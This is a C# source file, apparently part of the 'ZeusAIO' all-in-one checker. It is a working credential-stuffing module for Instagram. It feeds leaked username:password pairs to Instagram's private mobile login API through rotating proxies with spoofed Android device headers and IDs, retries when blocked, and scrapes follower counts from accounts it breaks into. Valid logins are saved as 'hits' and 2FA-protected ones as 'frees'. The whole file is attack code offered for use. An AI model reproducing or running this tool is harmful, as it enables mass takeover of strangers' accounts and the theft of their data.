using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;
using Newtonsoft.Json.Linq;
using Newtonsoft.Json;
using System.Web;
using HttpRequest = Leaf.xNet.HttpRequest;

namespace Instagram
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
           for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                        httpRequest.IgnoreProtocolErrors = true;
                        httpRequest.AllowAutoRedirect = false;
                        httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                        new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                        CookieStorage cookies = new CookieStorage();

                        string token = InstagramGetCSRF(ref cookies);

                        httpRequest.Cookies = cookies;
                        httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                        httpRequest.UserAgent = "Instagram 25.0.0.26.136 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-J730F; j7y17lte; samsungexynos7870)";
                        httpRequest.AddHeader("Pragma", "no-cache");
                        httpRequest.AddHeader("Accept", "*/*");
                        httpRequest.AddHeader("Cookie2", "$Version=1");
                        httpRequest.AddHeader("Accept-Language", "en-US");
                        httpRequest.AddHeader("X-IG-Capabilities", "3boBAA==");
                        httpRequest.AddHeader("X-IG-Connection-Type", "WIFI");
                        httpRequest.AddHeader("X-IG-Connection-Speed", "-1kbps");
                        httpRequest.AddHeader("X-IG-App-ID", "567067343352427");
                        httpRequest.AddHeader("rur", "ATN");

                        string guid = (GetRandomHexNumber(8) + "-" + GetRandomHexNumber(4) + "-4" + GetRandomHexNumber(3) + "-8" + GetRandomHexNumber(3) + "-" + GetRandomHexNumber(12)).ToLower();

                        string android_id = "android-" + GetRandomHexNumber(16);

                        string jsonData = HttpUtility.UrlEncode("{\"_csrftoken\":\"" + token + "\",\"adid\":\"" + guid + "\",\"country_codes\":\"[{\\\"country_code\\\":\\\"1\\\",\\\"source\\\":[\\\"default\\\"]}]\",\"device_id\":\"" + android_id + "\",\"google_tokens\":\"[]\",\"guid\":\"" + guid + "\",\"login_attempt_count\":0,\"password\":\"" + s[1] + "\",\"phone_id\":\"" + guid + "\",\"username\":\"" + s[0] + "\"}");

                        string strResponse = httpRequest.Post(new Uri("https://i.instagram.com/api/v1/accounts/login/"), new BytesContent(Encoding.Default.GetBytes("signed_body=9387a4ccde8c044515539b8249da655d63a73093eaf7c4b45fad126aa961e45b." + jsonData + "&ig_sig_key_version=4"))).ToString();

                        if (strResponse.Contains("logged_in_user"))
                        {
                            string is_verified = Regex.Match(strResponse, "is_verified\": (.*?),").Groups[1].Value;
                            string is_business = Regex.Match(strResponse, "is_business\": (.*?),").Groups[1].Value;
                            string is_private = Regex.Match(strResponse, "is_private\": (.*?),").Groups[1].Value;
                            string username = Regex.Match(strResponse, "\"username\": \"(.*?)\"").Groups[1].Value;

                            string otherCapture = "";
                            otherCapture = InstagramGetCaptures(cookies, username);

                            if (otherCapture == "")
                            {
                                ZeusAIO.mainmenu.hits++;
                                if (Config.config.LogorCui == "2")
                                {
                                    Console.WriteLine("[HIT - INSTAGRAM] " + s[0] + ":" + s[1] + " | " + $"Username: {username} - Verified: {is_verified} - Business: {is_business} - Private: {is_private}", Color.Green);
                                }
                                Export.AsResult("/Instagram_hits", s[0] + ":" + s[1] + " | " + $"Username: {username} - Verified: {is_verified} - Business: {is_business} - Private: {is_private}");
                                return false;
                              
                            }
                            ZeusAIO.mainmenu.hits++;
                            if (Config.config.LogorCui == "2")
                            {
                                Console.WriteLine("[HIT - INSTAGRAM] " + s[0] + ":" + s[1] + " | " + $"Username: {username} - Verified: {is_verified} - Business: {is_business} - Private: {is_private}{otherCapture}", Color.Green);
                            }
                            Export.AsResult("/Instagram_hits", s[0] + ":" + s[1] + " | " + $"Username: {username} - Verified: {is_verified} - Business: {is_business} - Private: {is_private}{otherCapture}");
                            return false;
                        }
                        else if (strResponse.Contains("challenge_required") || strResponse.Contains("\"two_factor_required\": true,"))
                        {
                            ZeusAIO.mainmenu.frees++;
                            if (Config.config.LogorCui == "2")
                            {
                                Console.WriteLine("[FREE - INSTAGRAM] " + s[0] + ":" + s[1] + " | 2fa", Color.OrangeRed);
                            }
                            Export.AsResult("/Instagram_frees", s[0] + ":" + s[1] + " | 2fa");
                            return false;
                        }
                        else if (strResponse.Contains("\"The password you entered is incorrect. Please try again.\"") || strResponse.Contains("\"The username you entered doesn't appear to belong to an account. Please check your username and try again.\",") || strResponse.Contains("\"Invalid Parameters\","))
                        {
                            break;
                        }
                        else
                            {
                                ZeusAIO.mainmenu.realretries++;
                                goto Retry;
                            }
                    }
                    break;
                }
                catch (Exception ex)
                {
                    ZeusAIO.mainmenu.errors++;
                }
            return false;
        }


        static string InstagramGetCSRF(ref CookieStorage cookies)
        {
            while (true)
                try
                {
                    using (HttpRequest httpRequest = new HttpRequest())
                    {
                        string proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                        if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                        {
                            httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                        }
                        if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                        {
                            httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                        }
                        if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                        {
                            httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                        }
                        httpRequest.IgnoreProtocolErrors = true;
                        httpRequest.AllowAutoRedirect = false;

                        cookies = new CookieStorage();
                        httpRequest.Cookies = cookies;
                        httpRequest.UserAgent = "Instagram 25.0.0.26.136 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-J730F; j7y17lte; samsungexynos7870)";

                        string strResponse = httpRequest.Get(new Uri("https://i.instagram.com/api/v1/accounts/login/")).ToString();

                        return cookies.GetCookies("https://i.instagram.com")["csrftoken"].Value;
                    }
                }
                catch
                {
                    ZeusAIO.mainmenu.errors++;
                }
            return "";
        }
        static string InstagramGetCaptures(CookieStorage cookies, string username)
        {
            while (true)
                try
                {
                    using (HttpRequest httpRequest = new HttpRequest())
                    {
                        string proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                        if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                        {
                            httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                        }
                        if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                        {
                            httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                        }
                        if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                        {
                            httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                        }
                        httpRequest.IgnoreProtocolErrors = true;
                        httpRequest.AllowAutoRedirect = false;

                        httpRequest.Cookies = cookies;
                        httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                        httpRequest.AddHeader("Pragma", "no-cache");
                        httpRequest.AddHeader("Accept", "*/*");

                        string strResponse = httpRequest.Get(new Uri($"https://www.instagram.com/{username}/")).ToString();

                        if (strResponse.Contains("\"edge_followed_by\":{\"count\":"))
                        {
                            string follower_count = Regex.Match(strResponse, "\"edge_followed_by\":{\"count\":(.*?)}").Groups[1].Value;
                            string following_count = Regex.Match(strResponse, ",\"edge_follow\":{\"count\":(.*?)}").Groups[1].Value;

                            return $" - Followers: {follower_count} - Following: {following_count}";
                        }
                        return "";
                    }
                }
                catch
                {
                    ZeusAIO.mainmenu.errors++;
                }
            return "";
        }

        static Random random = new Random();
        public static string GetRandomHexNumber(int digits)
        {
            byte[] buffer = new byte[digits / 2];
            random.NextBytes(buffer);
            string result = String.Concat(buffer.Select(x => x.ToString("X2")).ToArray());
            if (digits % 2 == 0)
                return result;
            return result + random.Next(16).ToString("X");
        }


    }
}
